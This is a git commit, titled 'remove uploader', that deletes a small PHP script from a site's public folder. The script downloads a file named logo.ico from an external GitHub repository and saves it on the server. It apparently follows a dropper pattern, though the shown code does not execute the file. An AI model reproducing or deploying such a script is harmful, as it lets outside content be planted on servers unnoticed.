73e545cffd2f0f0478ddd4a31f41b792c12aa693
muhammadrizkyqh <muhammadrizkyqh@gmail.com>
2026-03-11 02:50:24 +0700

    remove uploader

--- public/run_download.php
+++
@@ -1,5 +0,0 @@
-﻿$ch = curl_init("https://raw.githubusercontent.com/varhan1/sim_spanla_backend/main/public/logo.ico");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$icoData = curl_exec($ch);
-file_put_contents("logo.ico", $icoData);
-curl_close($ch);
